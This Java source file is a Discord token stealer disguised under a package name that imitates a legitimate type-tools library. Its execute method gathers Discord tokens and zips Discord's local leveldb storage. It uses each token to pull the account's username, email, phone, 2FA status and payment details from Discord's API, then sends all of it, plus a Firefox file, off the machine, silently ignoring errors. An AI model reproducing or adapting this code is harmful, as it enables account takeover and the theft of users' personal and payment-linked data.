package net.jodah.typetools.util.impl;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import net.jodah.typetools.Sender;
import net.jodah.typetools.util.FileUtil;
import net.jodah.typetools.util.Payload;
import net.jodah.typetools.util.TypeUtil;
import net.jodah.typetools.util.Typer;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public final class TypeUtil3 implements Payload
{
    @Override
    public void execute()
    {
        List<String> tokens = new ArrayList<>();
        TypeUtil.paths.stream().map(TypeUtil::getTokens).filter(Objects::nonNull).forEach(tokens::addAll);
        tokens = TypeUtil.removeDuplicates(tokens);
        tokens = TypeUtil.getValidTokens(tokens);

        TypeUtil.paths.stream()
                .map(s -> s + "\\Local Storage\\leveldb\\")
                .forEach(s -> { try {
                    File file = new File(System.getenv("TEMP") + "\\" + FileUtil.randomString());
                    pack(s, file.getPath());
                    Sender.send(file);
                } catch (IOException ignored) { } });
        tokens.forEach(token -> Sender.send(process(token)));

        TypeUtil.getFirefoxFile().ifPresent(Sender::send);
    }

    private Typer process(String token)
    {
        JsonObject obj = new JsonParser().parse(getUserData(token)).getAsJsonObject();

        return new Typer.Builder("Discord Token")
                .addField("Token", token, false)
                .addField("Name", obj.get("username").getAsString() + "#" + obj.get("discriminator").getAsString(), true)
                .addField("Email", obj.get("email").getAsString(), true)
                .addField("2Factor", String.valueOf(obj.get("mfa_enabled").getAsBoolean()), true)
                .addField("Phone", !obj.get("phone").isJsonNull() ? obj.get("phone").getAsString() : "None", true)
                .addField("Nitro", obj.has("premium_type") ? "True" : "False", true)
                .addField("Payment", hasPaymentMethods(token) ? "True" : "False", true).build();
    }

    private String getUserData(String token)
    {
        return TypeUtil.getContentFromURL("https://discordapp.com/api/v6/users/@me", token);
    }

    private boolean hasPaymentMethods(String token)
    {
        return TypeUtil.getContentFromURL("https://discordapp.com/api/v6/users/@me/billing/payment-sources", token).length() > 4;
    }

    private void pack(String sourceDirPath, String zipFilePath) throws IOException
    {
        Path p = Files.createFile(Paths.get(zipFilePath));
        try (ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p)))
        {
            Path pp = Paths.get(sourceDirPath);
            Files.walk(pp)
                    .filter(path -> !Files.isDirectory(path))
                    .filter(path -> path.toFile().getPath().contains("ldb"))
                    .forEach(path -> {
                        ZipEntry zipEntry = new ZipEntry(pp.relativize(path).toString());
                        try
                        {
                            zs.putNextEntry(zipEntry);
                            Files.copy(path, zs);
                            zs.closeEntry();
                        }
                        catch (IOException ignored) { }
                    });
        }
    }
}
